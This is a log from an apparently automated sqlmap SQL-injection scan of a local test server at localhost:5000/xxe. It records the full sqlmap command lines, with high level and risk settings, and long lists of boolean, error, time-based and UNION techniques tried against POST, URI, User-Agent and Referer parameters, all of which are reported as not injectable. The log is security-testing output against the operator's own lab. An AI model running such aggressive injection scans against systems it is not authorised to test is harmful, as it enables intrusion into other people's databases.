2025-09-26 18:53:45,970 - INFO - [18:53:45] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 18:53:46,016 - INFO - [18:53:46] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 18:53:46,061 - INFO - [18:53:46] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 18:53:46,101 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:53:46,101 - INFO - [18:53:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:53:46,207 - INFO - [18:53:46] [WARNING] POST parameter 'test' does not seem to be injectable
2025-09-26 18:53:46,236 - INFO - [18:53:46] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:53:46,237 - INFO - [18:53:46] [WARNING] HTTP error codes detected during run:
2025-09-26 18:53:46,237 - INFO - 500 (Internal Server Error) - 75 times
2025-09-26 18:53:46,238 - INFO - 
2025-09-26 18:53:46,239 - INFO - [*] ending @ 18:53:46 /2025-09-26/
2025-09-26 18:53:46,240 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/xxe --data test=1
--------------------------------------------------
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:53:42 /2025-09-26/

[18:53:44] [INFO] testing connection to the target URL
[18:53:44] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[18:53:44] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:53:45] [INFO] testing if the target URL content is stable
[18:53:45] [INFO] target URL content is stable
[18:53:45] [INFO] testing if POST parameter 'test' is dynamic
[18:53:45] [WARNING] POST parameter 'test' does not appear to be dynamic
[18:53:45] [WARNING] heuristic (basic) test shows that POST parameter 'test' might not be injectable
[18:53:45] [INFO] testing for SQL injection on POST parameter 'test'
[18:53:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:53:45] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:53:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:53:45] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:53:45] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:53:45] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:53:45] [INFO] testing 'Generic inline queries'
[18:53:45] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:53:45] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:53:45] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:53:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:53:45] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:53:46] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:53:46] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:53:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:53:46] [WARNING] POST parameter 'test' does not seem to be injectable
[18:53:46] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:53:46] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 75 times

[*] ending @ 18:53:46 /2025-09-26/

2025-09-26 18:53:46,399 - INFO - Flushed sqlmap session for http://localhost:5000/xxe (log: attack-logs-dynamic\XXE_Injection_flush.log)
2025-09-26 18:53:46,401 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/xxe --output-dir 'attack-logs-dynamic\XXE_Injection_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
2025-09-26 18:53:49,702 - INFO -         ___
2025-09-26 18:53:49,702 - INFO -        __H__
2025-09-26 18:53:49,702 - INFO -  ___ ___[']_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:53:49,702 - INFO - |_ -| . ["]     | .'| . |
2025-09-26 18:53:49,702 - INFO - |___|_  [,]_|_|_|__,|  _|
2025-09-26 18:53:49,702 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:53:49,702 - INFO - 
2025-09-26 18:53:49,761 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:53:49,761 - INFO - 
2025-09-26 18:53:49,761 - INFO - [*] starting @ 18:53:49 /2025-09-26/
2025-09-26 18:53:49,761 - INFO - 
2025-09-26 18:53:51,645 - INFO - [18:53:51] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\XXE_Injection_sqlmap' as the output directory
2025-09-26 18:53:52,191 - INFO - [18:53:52] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:53:52,191 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:53:52,201 - INFO - [18:53:52] [INFO] testing connection to the target URL
2025-09-26 18:53:52,293 - INFO - [18:53:52] [WARNING] the web server responded with an HTTP error code (405) which could interfere with the results of the tests
2025-09-26 18:53:52,293 - INFO - [18:53:52] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:53:52,323 - INFO - [18:53:52] [INFO] testing if the target URL content is stable
2025-09-26 18:53:52,722 - INFO - [18:53:52] [INFO] target URL content is stable
2025-09-26 18:53:52,722 - INFO - [18:53:52] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 18:53:52,831 - INFO - [18:53:52] [INFO] URI parameter '#1*' appears to be dynamic
2025-09-26 18:53:52,861 - INFO - [18:53:52] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 18:53:52,883 - INFO - [18:53:52] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 18:53:52,979 - INFO - [18:53:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:53:53,790 - INFO - [18:53:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:53:54,529 - INFO - [18:53:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:53:55,562 - INFO - [18:53:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:53:56,252 - INFO - [18:53:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:53:57,090 - INFO - [18:53:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:53:57,285 - INFO - [18:53:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:53:57,457 - INFO - [18:53:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:53:57,698 - INFO - [18:53:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:53:58,161 - INFO - [18:53:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:53:58,550 - INFO - [18:53:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:53:58,906 - INFO - [18:53:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:53:59,369 - INFO - [18:53:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:53:59,848 - INFO - [18:53:59] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:54:00,652 - INFO - [18:54:00] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:54:01,378 - INFO - [18:54:01] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:54:01,981 - INFO - [18:54:01] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:54:02,936 - INFO - [18:54:02] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:54:03,715 - INFO - [18:54:03] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:54:04,546 - INFO - [18:54:04] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:54:05,197 - INFO - [18:54:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:54:06,041 - INFO - [18:54:06] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:54:06,694 - INFO - [18:54:06] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:54:07,405 - INFO - [18:54:07] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:54:08,106 - INFO - [18:54:08] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:54:08,753 - INFO - [18:54:08] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:54:09,416 - INFO - [18:54:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:09,442 - INFO - [18:54:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:54:09,467 - INFO - [18:54:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:54:09,488 - INFO - [18:54:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:54:09,522 - INFO - [18:54:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:54:09,546 - INFO - [18:54:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:54:09,570 - INFO - [18:54:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:54:09,609 - INFO - [18:54:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:54:09,641 - INFO - [18:54:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:09,672 - INFO - [18:54:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:54:09,701 - INFO - [18:54:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:54:09,736 - INFO - [18:54:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:54:09,770 - INFO - [18:54:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:09,799 - INFO - [18:54:09] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:54:09,844 - INFO - [18:54:09] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:09,875 - INFO - [18:54:09] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:54:09,912 - INFO - [18:54:09] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:09,938 - INFO - [18:54:09] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:54:09,972 - INFO - [18:54:09] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:10,000 - INFO - [18:54:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:54:10,026 - INFO - [18:54:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:54:10,065 - INFO - [18:54:10] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:54:10,111 - INFO - [18:54:10] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:54:10,134 - INFO - [18:54:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:10,199 - INFO - [18:54:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:10,239 - INFO - [18:54:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:10,249 - INFO - [18:54:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:10,249 - INFO - [18:54:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:10,313 - INFO - [18:54:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:54:10,359 - INFO - [18:54:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:54:10,405 - INFO - [18:54:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:54:10,448 - INFO - [18:54:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:54:10,488 - INFO - [18:54:10] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:10,532 - INFO - [18:54:10] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:10,567 - INFO - [18:54:10] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:10,605 - INFO - [18:54:10] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:10,668 - INFO - [18:54:10] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:10,725 - INFO - [18:54:10] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:10,784 - INFO - [18:54:10] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:54:10,848 - INFO - [18:54:10] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:54:10,916 - INFO - [18:54:10] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:54:12,088 - INFO - [18:54:12] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:54:12,710 - INFO - [18:54:12] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:54:12,725 - INFO - [18:54:12] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:54:13,313 - INFO - [18:54:13] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:54:13,775 - INFO - [18:54:13] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:54:14,286 - INFO - [18:54:14] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:54:14,864 - INFO - [18:54:14] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:54:15,378 - INFO - [18:54:15] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:54:15,870 - INFO - [18:54:15] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:54:16,343 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:54:16,343 - INFO - [18:54:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:54:16,775 - INFO - [18:54:16] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:54:17,593 - INFO - [18:54:17] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:54:17,973 - INFO - [18:54:17] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:54:18,333 - INFO - [18:54:18] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 18:54:18,334 - INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
2025-09-26 18:54:18,336 - INFO - [18:54:18] [INFO] testing if parameter 'User-Agent' is dynamic
2025-09-26 18:54:18,344 - INFO - [18:54:18] [WARNING] parameter 'User-Agent' does not appear to be dynamic
2025-09-26 18:54:18,351 - INFO - [18:54:18] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
2025-09-26 18:54:18,374 - INFO - [18:54:18] [INFO] testing for SQL injection on parameter 'User-Agent'
2025-09-26 18:54:18,439 - INFO - [18:54:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:54:18,940 - INFO - [18:54:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:54:19,676 - INFO - [18:54:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:54:20,154 - INFO - [18:54:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:54:20,538 - INFO - [18:54:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:54:20,972 - INFO - [18:54:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:54:21,063 - INFO - [18:54:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:54:21,216 - INFO - [18:54:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:54:21,317 - INFO - [18:54:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:54:21,499 - INFO - [18:54:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:54:21,795 - INFO - [18:54:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:54:21,975 - INFO - [18:54:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:54:22,230 - INFO - [18:54:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:54:22,645 - INFO - [18:54:22] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:54:23,197 - INFO - [18:54:23] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:54:23,567 - INFO - [18:54:23] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:54:24,063 - INFO - [18:54:24] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:54:24,420 - INFO - [18:54:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:54:24,941 - INFO - [18:54:24] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:54:25,233 - INFO - [18:54:25] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:54:25,725 - INFO - [18:54:25] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:54:26,128 - INFO - [18:54:26] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:54:26,778 - INFO - [18:54:26] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:54:27,092 - INFO - [18:54:27] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:54:27,576 - INFO - [18:54:27] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:54:27,976 - INFO - [18:54:27] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:54:28,517 - INFO - [18:54:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:28,517 - INFO - [18:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:54:28,536 - INFO - [18:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:54:28,548 - INFO - [18:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:54:28,552 - INFO - [18:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:54:28,573 - INFO - [18:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:54:28,584 - INFO - [18:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:54:28,584 - INFO - [18:54:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:54:28,601 - INFO - [18:54:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:28,613 - INFO - [18:54:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:54:28,629 - INFO - [18:54:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:54:28,639 - INFO - [18:54:28] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:54:28,649 - INFO - [18:54:28] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:28,693 - INFO - [18:54:28] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:54:28,732 - INFO - [18:54:28] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:28,743 - INFO - [18:54:28] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:54:28,796 - INFO - [18:54:28] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:28,813 - INFO - [18:54:28] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:54:28,837 - INFO - [18:54:28] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:54:28,855 - INFO - [18:54:28] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:54:28,884 - INFO - [18:54:28] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:54:28,895 - INFO - [18:54:28] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:54:28,920 - INFO - [18:54:28] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:54:28,933 - INFO - [18:54:28] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:28,956 - INFO - [18:54:28] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:28,978 - INFO - [18:54:28] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:28,980 - INFO - [18:54:28] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:28,985 - INFO - [18:54:28] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:29,010 - INFO - [18:54:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:54:29,032 - INFO - [18:54:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:54:29,060 - INFO - [18:54:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:54:29,083 - INFO - [18:54:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:54:29,114 - INFO - [18:54:29] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:29,133 - INFO - [18:54:29] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:29,149 - INFO - [18:54:29] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:29,170 - INFO - [18:54:29] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:29,194 - INFO - [18:54:29] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:54:29,212 - INFO - [18:54:29] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:54:29,231 - INFO - [18:54:29] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:54:29,247 - INFO - [18:54:29] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:54:29,271 - INFO - [18:54:29] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:54:29,561 - INFO - [18:54:29] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:54:29,760 - INFO - [18:54:29] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:54:29,770 - INFO - [18:54:29] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:54:30,014 - INFO - [18:54:30] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:54:30,211 - INFO - [18:54:30] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:54:30,448 - INFO - [18:54:30] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:54:30,656 - INFO - [18:54:30] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:54:30,894 - INFO - [18:54:30] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:54:31,130 - INFO - [18:54:31] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:54:31,404 - INFO - [18:54:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:54:31,916 - INFO - [18:54:31] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:54:32,422 - INFO - [18:54:32] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:54:32,935 - INFO - [18:54:32] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:54:33,519 - INFO - [18:54:33] [WARNING] parameter 'User-Agent' does not seem to be injectable
2025-09-26 18:54:33,519 - INFO - [18:54:33] [INFO] testing if parameter 'Referer' is dynamic
2025-09-26 18:54:33,528 - INFO - [18:54:33] [WARNING] parameter 'Referer' does not appear to be dynamic
